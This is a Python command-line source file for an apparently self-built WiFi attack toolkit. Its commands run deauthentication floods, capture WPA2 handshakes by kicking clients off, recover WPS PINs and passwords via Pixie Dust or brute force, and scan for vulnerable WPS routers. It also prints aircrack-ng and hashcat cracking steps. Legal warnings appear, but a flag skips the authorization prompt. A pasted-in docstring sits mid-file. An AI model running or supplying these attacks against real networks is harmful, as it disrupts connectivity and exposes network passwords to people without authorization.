"""
Attack Commands - CLI commands for attack modules
"""

import typer
from typing import Optional
from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.panel import Panel
from loguru import logger

from src.core.interface_manager import InterfaceManager
from src.attacks.deauth import DeauthAttack, DeauthTarget
from src.attacks.handshake_capture import HandshakeCapture
from datetime import datetime
from pathlib import Path
from src.attacks.wps_attack import WPSAttack
from src.attacks.wps_models import WPSAttackType


app = typer.Typer(name="attack", help="🔥 Attack modules")
console = Console()


@app.command()
def deauth(
    bssid: str = typer.Option(..., "--bssid", "-b", help="Target AP BSSID"),
    channel: int = typer.Option(..., "--channel", "-c", help="WiFi channel"),
    client: Optional[str] = typer.Option(None, "--client", help="Target client MAC (broadcast if not specified)"),
    count: int = typer.Option(10, "--count", "-n", help="Packets per burst"),
    duration: Optional[int] = typer.Option(None, "--duration", "-d", help="Attack duration in seconds"),
    interface: Optional[str] = typer.Option(None, "--interface", "-i", help="Wireless interface"),
    yes: bool = typer.Option(False, "--yes", "-y", help="Skip confirmation")
):
    """
    🔥 Deauthentication attack
    
    Force disconnect clients from an access point.
    
    ⚠️  LEGAL WARNING: Only use on networks you own or have authorization to test!
    
    Examples:
        # Single burst to all clients
        attack deauth -b aa:bb:cc:dd:ee:ff -c 6
        
        # Continuous attack for 30 seconds
        attack deauth -b aa:bb:cc:dd:ee:ff -c 6 -d 30
        
        # Target specific client
        attack deauth -b aa:bb:cc:dd:ee:ff -c 6 --client 11:22:33:44:55:66
    """
    
    # Display legal warning
    console.print("\n[bold red]⚠️  LEGAL WARNING[/bold red]\n")
    console.print("Deauthentication attacks are ILLEGAL without proper authorization.")
    console.print("Only use this tool on:")
    console.print("  • Networks you own")
    console.print("  • Networks where you have written permission")
    console.print("  • Controlled lab environments\n")
    
    # Confirmation
    if not yes:
        authorized = Confirm.ask("Do you have authorization to test this network?")
        if not authorized:
            console.print("[yellow]Attack cancelled. Good choice![/yellow]")
            raise typer.Exit(0)
    
    # Get interface
    if not interface:
        interfaces = InterfaceManager.list_interfaces()
        if not interfaces:
            console.print("[bold red]❌ No wireless interfaces found![/bold red]")
            raise typer.Exit(1)
        interface = interfaces[0]
    
    console.print(f"\n📡 Using interface: [cyan]{interface}[/cyan]")
    
    # Enable monitor mode
    console.print("🔧 Enabling monitor mode...")
    manager = InterfaceManager(interface)
    
    if not manager.enable_monitor_mode():
        console.print("[bold red]❌ Failed to enable monitor mode[/bold red]")
        raise typer.Exit(1)
    
    console.print("[green]✓ Monitor mode enabled[/green]\n")
    
    try:
        # Create attack
        attack = DeauthAttack(interface)
        
        # Create target
        target = DeauthTarget(
            bssid=bssid,
            client_mac=client or DeauthAttack.BROADCAST_MAC,
            channel=channel
        )
        
        # Display attack info
        target_desc = "all clients (broadcast)" if target.is_broadcast else client
        
        info_text = f"""
[cyan]Target AP:[/cyan] {bssid}
[cyan]Target Client:[/cyan] {target_desc}
[cyan]Channel:[/cyan] {channel}
[cyan]Packets per burst:[/cyan] {count}
[cyan]Duration:[/cyan] {f'{duration}s' if duration else 'Single burst'}
        """
        
        console.print(Panel(info_text, title="🎯 Attack Configuration", border_style="red"))
        
        # Register callback for progress
        def on_event(event, data):
            if event == 'deauth_sent':
                console.print(f"  → Sent {data['total_sent']} packets", style="dim")
        
        attack.register_callback(on_event)
        
        # Execute attack
        console.print("\n[bold red]🚀 Starting deauth attack...[/bold red]\n")
        
        result = attack.execute(
            target=target,
            count=count,
            interval=0.1,
            duration=duration
        )
        
        # Display result
        console.print("\n" + "=" * 60)
        if result.success:
            console.print("[bold green]✅ Attack completed successfully[/bold green]")
        else:
            console.print("[bold red]❌ Attack failed[/bold red]")
        
        console.print(f"\nStatus: {result.status.value}")
        console.print(f"Message: {result.message}")
        console.print(f"Duration: {result.duration:.2f}s")
        
        if result.data:
            console.print(f"Packets sent: {result.data.get('packets_sent', 0)}")
        
        console.print("=" * 60 + "\n")
        
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Attack interrupted[/yellow]")
        attack.stop()
    finally:
        # Restore managed mode
        console.print("🔧 Restoring interface...")
        manager.disable_monitor_mode()
        console.print("[green]✓ Interface restored[/green]\n")


@app.command()
def handshake(
    bssid: str = typer.Option(..., "--bssid", "-b", help="Target AP BSSID"),
    client: str = typer.Option(..., "--client", "-c", help="Target client MAC"),
    channel: int = typer.Option(..., "--channel", help="WiFi channel"),
    ssid: Optional[str] = typer.Option(None, "--ssid", "-s", help="AP SSID (optional)"),
    timeout: int = typer.Option(60, "--timeout", "-t", help="Capture timeout per attempt (seconds)"),
    attempts: int = typer.Option(3, "--attempts", "-a", help="Maximum capture attempts"),
    output: Optional[str] = typer.Option(None, "--output", "-o", help="Output file path"),
    interface: Optional[str] = typer.Option(None, "--interface", "-i", help="Wireless interface"),
    yes: bool = typer.Option(False, "--yes", "-y", help="Skip confirmation")
):
    """
    🤝 Capture WPA2 handshake
    
    Captures 4-way handshake by deauthing client and monitoring reconnection.
    
    ⚠️  LEGAL WARNING: Only use on networks you own or have authorization to test!
    
    Examples:
        # Capture handshake from specific client
        attack handshake -b aa:bb:cc:dd:ee:ff -c 11:22:33:44:55:66 --channel 6
        
        # With SSID and custom timeout
        attack handshake -b aa:bb:cc:dd:ee:ff -c 11:22:33:44:55:66 --channel 6 -s MyNetwork -t 90
        
        # Multiple attempts
        attack handshake -b aa:bb:cc:dd:ee:ff -c 11:22:33:44:55:66 --channel 6 -a 5
    """
    from rich.progress import Progress, SpinnerColumn, TextColumn
    
    # Display legal warning
    console.print("\n[bold red]⚠️  LEGAL WARNING[/bold red]\n")
    console.print("Handshake capture attacks are ILLEGAL without proper authorization.")
    console.print("Only use this tool on networks you own or have written permission.\n")
    
    # Confirmation
    if not yes:
        authorized = Confirm.ask("Do you have authorization to test this network?")
        if not authorized:
            console.print("[yellow]Attack cancelled.[/yellow]")
            raise typer.Exit(0)
    
    # Get interface
    if not interface:
        interfaces = InterfaceManager.list_interfaces()
        if not interfaces:
            console.print("[bold red]❌ No wireless interfaces found![/bold red]")
            raise typer.Exit(1)
        interface = interfaces[0]
    
    console.print(f"\n📡 Using interface: [cyan]{interface}[/cyan]")
    
    # Enable monitor mode
    console.print("🔧 Enabling monitor mode...")
    manager = InterfaceManager(interface)
    
    if not manager.enable_monitor_mode():
        console.print("[bold red]❌ Failed to enable monitor mode[/bold red]")
        raise typer.Exit(1)
    
    console.print("[green]✓ Monitor mode enabled[/green]\n")
    
    try:
        # Display attack info
        info_text = f"""
[cyan]Target AP:[/cyan] {bssid} ({ssid or 'Unknown'})
[cyan]Target Client:[/cyan] {client}
[cyan]Channel:[/cyan] {channel}
[cyan]Timeout:[/cyan] {timeout}s per attempt
[cyan]Max Attempts:[/cyan] {attempts}
        """
        
        console.print(Panel(info_text, title="🎯 Capture Configuration", border_style="cyan"))
        
        # Create capture
        capture = HandshakeCapture(interface)
        
        # Progress tracking
        messages_captured = {"M1": False, "M2": False, "M3": False, "M4": False}
        
        def on_eapol(eapol_pkt, handshake):
            """Callback for EAPOL packets"""
            msg_name = eapol_pkt.message_type.name.replace("MESSAGE_", "M")
            messages_captured[msg_name] = True
            
            # Update display
            status = " | ".join([
                f"{k}: {'✓' if v else '✗'}" 
                for k, v in messages_captured.items()
            ])
            console.print(f"  [cyan]→ Captured {msg_name}[/cyan] | {status}")
        
        def on_complete(handshake):
            """Callback for complete handshake"""
            console.print("\n[bold green]✅ Complete handshake captured![/bold green]")
        
        capture.on_eapol_packet = on_eapol
        capture.on_handshake_complete = on_complete
        
        console.print("\n[bold cyan]🚀 Starting handshake capture...[/bold cyan]\n")
        console.print("[dim]This will:\n  1. Send deauth to disconnect client\n  2. Monitor for reconnection\n  3. Capture 4-way handshake\n  4. Validate completeness[/dim]\n") 
        # Execute capture
        result = capture.execute(
            bssid=bssid,
            client_mac=client,
            channel=channel,
            ssid=ssid,
            timeout=timeout,
            max_attempts=attempts
        )
        
        # Display result
        console.print("\n" + "=" * 70)
        
        if result.success:
            console.print("[bold green]✅ Handshake capture successful![/bold green]\n")
            
            # Save handshake
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_dir = Path("data/handshakes")
            output_dir.mkdir(parents=True, exist_ok=True)
            
            # Generate filenames
            safe_ssid = (ssid or bssid.replace(":", ""))[:20]
            base_name = f"{safe_ssid}_{timestamp}"
            
            pcap_file = output_dir / f"{base_name}.pcap"
            json_file = output_dir / f"{base_name}.json"
            
            # Save files
            handshake_obj = result.data.get('handshake')
            if handshake_obj:
                # Save PCAP
                if capture.save_handshake(capture.current_handshake, str(pcap_file), "pcap"):
                    console.print(f"[green]✓ PCAP:[/green] {pcap_file}")
                
                # Save JSON metadata
                if capture.save_handshake(capture.current_handshake, str(json_file), "json"):
                    console.print(f"[green]✓ Metadata:[/green] {json_file}")
            
            # Display handshake info
            console.print(f"\n[cyan]Handshake Details:[/cyan]")
            console.print(f"  SSID: {ssid or 'Unknown'}")
            console.print(f"  BSSID: {bssid}")
            console.print(f"  Client: {client}")
            console.print(f"  Completeness: {result.data.get('handshake', {}).get('completeness', 0)}%")
            console.print(f"  Attempts: {result.data.get('attempts', 0)}")
            
            # Cracking instructions
            console.print(f"\n[bold yellow]Next Steps - Password Cracking:[/bold yellow]")
            console.print(f"  [dim]# Using aircrack-ng:[/dim]")
            console.print(f"  aircrack-ng -w wordlist.txt {pcap_file}")
            console.print(f"\n  [dim]# Convert to hashcat format:[/dim]")
            console.print(f"  cap2hccapx {pcap_file} {base_name}.hccapx")
            console.print(f"  hashcat -m 22000 {base_name}.hccapx wordlist.txt")
            
        else:
            console.print("[bold red]❌ Handshake capture failed[/bold red]\n")
            console.print(f"Reason: {result.message}")
            
            if result.data:
                completeness = result.data.get('handshake', {}).get('completeness', 0)
                console.print(f"Partial capture: {completeness}%")
                
                messages = result.data.get('handshake', {}).get('messages', {})
                console.print(f"Messages captured:")
                for msg, captured in messages.items():
                    status = "✓" if captured else "✗"
                    console.print(f"  {status} {msg}")
        
        console.print("=" * 70 + "\n")
        
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Capture interrupted[/yellow]")
        capture.stop()
    finally:
        # Restore managed mode
        console.print("🔧 Restoring interface...")
        manager.disable_monitor_mode()
        console.print("[green]✓ Interface restored[/green]\n")
    """
WPS Attack CLI Command
Add this to src/cli/attack_commands.py
"""

@app.command()
def wps(
    bssid: str = typer.Option(..., "--bssid", "-b", help="Target AP BSSID"),
    channel: int = typer.Option(..., "--channel", "-c", help="WiFi channel"),
    ssid: Optional[str] = typer.Option(None, "--ssid", "-s", help="AP SSID (optional)"),
    mode: str = typer.Option("pixie", "--mode", "-m", help="Attack mode: pixie, brute, auto"),
    timeout: int = typer.Option(60, "--timeout", "-t", help="Timeout in seconds"),
    interface: Optional[str] = typer.Option(None, "--interface", "-i", help="Wireless interface"),
    yes: bool = typer.Option(False, "--yes", "-y", help="Skip confirmation")
):
    """
    📶 WPS attack (Pixie Dust / PIN brute force)
    
    Exploits WPS vulnerabilities to recover WiFi password.
    Pixie Dust is FAST (seconds), brute force is SLOW (hours).
    
    ⚠️  LEGAL WARNING: Only use on networks you own or have authorization to test!
    
    Examples:
        # Pixie Dust attack (fast!)
        attack wps -b aa:bb:cc:dd:ee:ff -c 6 -m pixie
        
        # Automatic (try Pixie Dust, then brute force)
        attack wps -b aa:bb:cc:dd:ee:ff -c 6 -m auto
        
        # PIN brute force (slow but thorough)
        attack wps -b aa:bb:cc:dd:ee:ff -c 6 -m brute -t 3600
    """
    from src.attacks.wps_attack import WPSAttack
    from src.attacks.wps_models import WPSAttackType
    
    # Map mode string to enum
    mode_map = {
        'pixie': WPSAttackType.PIXIE_DUST,
        'brute': WPSAttackType.PIN_BRUTEFORCE,
        'auto': WPSAttackType.AUTOMATIC
    }
    
    if mode not in mode_map:
        console.print(f"[red]Invalid mode: {mode}[/red]")
        console.print("[yellow]Valid modes: pixie, brute, auto[/yellow]")
        raise typer.Exit(1)
    
    attack_type = mode_map[mode]
    
    # Legal warning
    console.print("\n[bold red]⚠️  LEGAL WARNING[/bold red]\n")
    console.print("WPS attacks are ILLEGAL without proper authorization.")
    console.print("Only use this tool on networks you own or have written permission.\n")
    
    # Confirmation
    if not yes:
        authorized = Confirm.ask("Do you have authorization to test this network?")
        if not authorized:
            console.print("[yellow]Attack cancelled.[/yellow]")
            raise typer.Exit(0)
    
    # Get interface
    if not interface:
        interfaces = InterfaceManager.list_interfaces()
        if not interfaces:
            console.print("[bold red]❌ No wireless interfaces found![/bold red]")
            raise typer.Exit(1)
        interface = interfaces[0]
    
    console.print(f"\n📡 Using interface: [cyan]{interface}[/cyan]")
    
    # Check for reaver
    import subprocess
    try:
        subprocess.run(['which', 'reaver'], check=True, capture_output=True)
    except subprocess.CalledProcessError:
        console.print("\n[bold red]❌ reaver not found![/bold red]")
        console.print("[yellow]Install with:[/yellow] sudo apt install reaver")
        raise typer.Exit(1)
    
    # Enable monitor mode
    console.print("🔧 Enabling monitor mode...")
    manager = InterfaceManager(interface)
    
    if not manager.enable_monitor_mode():
        console.print("[bold red]❌ Failed to enable monitor mode[/bold red]")
        raise typer.Exit(1)
    
    console.print("[green]✓ Monitor mode enabled[/green]\n")
    
    try:
        # Display attack info
        mode_desc = {
            WPSAttackType.PIXIE_DUST: "Pixie Dust (Fast - exploits weak RNG)",
            WPSAttackType.PIN_BRUTEFORCE: "PIN Brute Force (Slow - tries all PINs)",
            WPSAttackType.AUTOMATIC: "Automatic (Pixie Dust → Brute Force)"
        }
        
        info_text = f"""
[cyan]Target AP:[/cyan] {bssid} ({ssid or 'Unknown'})
[cyan]Channel:[/cyan] {channel}
[cyan]Attack Mode:[/cyan] {mode_desc[attack_type]}
[cyan]Timeout:[/cyan] {timeout}s
        """
        
        console.print(Panel(info_text, title="🎯 WPS Attack Configuration", border_style="magenta"))
        
        # Create attack
        attack = WPSAttack(interface)
        
        # Progress callback
        def on_progress(pins_tried, total_pins):
            percentage = (pins_tried / total_pins) * 100
            console.print(f"  Progress: {pins_tried}/{total_pins} PINs ({percentage:.1f}%)", end='\r')
        
        attack.on_progress = on_progress
        
        console.print("\n[bold magenta]🚀 Starting WPS attack...[/bold magenta]\n")
        
        if attack_type == WPSAttackType.PIXIE_DUST:
            console.print("Attempting Pixie Dust attack...")
            console.print("This exploits weak random number generation.")
            console.print("If vulnerable, PIN will be found in seconds!\n")
        elif attack_type == WPSAttackType.PIN_BRUTEFORCE:
            console.print("Starting PIN brute force...")
            console.print("This will try all ~11,000 valid WPS PINs.")
            console.print("May take several hours. Press Ctrl+C to stop.\n")
        else:
            console.print("Trying Pixie Dust first (fast)...")
            console.print("Will fall back to brute force if Pixie Dust fails.\n")
        
        # Execute attack
        result = attack.execute(
            bssid=bssid,
            channel=channel,
            ssid=ssid,
            attack_type=attack_type,
            timeout=timeout
        )
        
        # Display result
        console.print("\n" + "=" * 70)
        
        if result.success:
            console.print("[bold green]✅ WPS CRACKED![/bold green]\n")
            
            data = result.data
            console.print(f"[bold cyan]WPS PIN:[/bold cyan] [bold green]{data.get('pin')}[/bold green]")
            console.print(f"[bold cyan]WiFi Password:[/bold cyan] [bold green]{data.get('psk')}[/bold green]")
            console.print(f"\nDuration: {data.get('duration_seconds', 0):.1f}s")
            
            if data.get('pixie_dust_success'):
                console.print("[yellow]Method: Pixie Dust (AP has weak RNG!)[/yellow]")
            else:
                console.print(f"[yellow]Method: PIN Brute Force ({data.get('total_pins_tried', 0)} PINs tried)[/yellow]")
            
            # Save result
            from datetime import datetime
            from pathlib import Path
            import json
            
            output_dir = Path("data/wps_results")
            output_dir.mkdir(parents=True, exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_ssid = (ssid or bssid.replace(":", ""))[:20]
            result_file = output_dir / f"{safe_ssid}_{timestamp}.json"
            
            with open(result_file, 'w') as f:
                json.dump(data, f, indent=2)
            
            console.print(f"\n[green]✓ Results saved:[/green] {result_file}")
            
        else:
            console.print("[bold red]❌ WPS attack failed[/bold red]\n")
            console.print(f"Reason: {result.message}")
            
            if result.data:
                if result.data.get('pixie_dust_attempted') and not result.data.get('pixie_dust_success'):
                    console.print("\n[yellow]Note:[/yellow] AP is not vulnerable to Pixie Dust")
                    console.print("This router uses strong random number generation")
                
                pins_tried = result.data.get('total_pins_tried', 0)
                if pins_tried > 0:
                    console.print(f"\nPINs attempted: {pins_tried}")
                    console.print(f"Estimated remaining: {11000 - pins_tried} PINs")
        
        console.print("=" * 70 + "\n")
        
    except KeyboardInterrupt:
        console.print("\n[yellow]⚠️  Attack interrupted[/yellow]")
        attack.stop()
    finally:
        # Restore managed mode
        console.print("🔧 Restoring interface...")
        manager.disable_monitor_mode()
        console.print("[green]✓ Interface restored[/green]\n")


@app.command()
def wps_scan(
    timeout: int = typer.Option(30, "--timeout", "-t", help="Scan duration"),
    interface: Optional[str] = typer.Option(None, "--interface", "-i", help="Wireless interface")
):
    """
    📡 Scan for WPS-enabled networks
    
    Identifies networks with WPS enabled and their lock status.
    """
    from src.attacks.wps_attack import WPSAttack
    
    # Get interface
    if not interface:
        interfaces = InterfaceManager.list_interfaces()
        if not interfaces:
            console.print("[bold red]❌ No wireless interfaces found![/bold red]")
            raise typer.Exit(1)
        interface = interfaces[0]
    
    console.print(f"\n📡 Using interface: [cyan]{interface}[/cyan]")
    
    # Check for wash
    import subprocess
    try:
        subprocess.run(['which', 'wash'], check=True, capture_output=True)
    except subprocess.CalledProcessError:
        console.print("\n[bold red]❌ wash not found![/bold red]")
        console.print("[yellow]Install with:[/yellow] sudo apt install reaver")
        raise typer.Exit(1)
    
    # Enable monitor mode
    console.print("🔧 Enabling monitor mode...")
    manager = InterfaceManager(interface)
    
    if not manager.enable_monitor_mode():
        console.print("[bold red]❌ Failed to enable monitor mode[/bold red]")
        raise typer.Exit(1)
    
    console.print("[green]✓ Monitor mode enabled[/green]\n")
    
    try:
        console.print(f"[cyan]Scanning for WPS networks ({timeout}s)...[/cyan]\n")
        
        attack = WPSAttack(interface)
        networks = attack.enumerate_wps(timeout)
        
        if not networks:
            console.print("[yellow]No WPS-enabled networks found[/yellow]")
        else:
            from rich.table import Table
            
            table = Table(title=f"WPS-Enabled Networks ({len(networks)} found)")
            table.add_column("#", style="dim", width=3)
            table.add_column("SSID", width=20)
            table.add_column("BSSID", width=17)
            table.add_column("Ch", width=3)
            table.add_column("Locked", width=8)
            table.add_column("Version", width=8)
            
            for idx, net in enumerate(networks, 1):
                locked_display = "[red]Yes[/red]" if net.wps_locked.value == "locked" else "[green]No[/green]"
                
                table.add_row(
                    str(idx),
                    net.ssid or "(Hidden)",
                    net.bssid,
                    str(net.channel),
                    locked_display,
                    net.wps_version or "?"
                )
            
            console.print(table)
            console.print(f"\n[dim]💡 Unlocked networks are good targets for WPS attack[/dim]")
        
    finally:
        console.print("\n🔧 Restoring interface...")
        manager.disable_monitor_mode()
        console.print("[green]✓ Interface restored[/green]\n")       

if __name__ == "__main__":
    app()
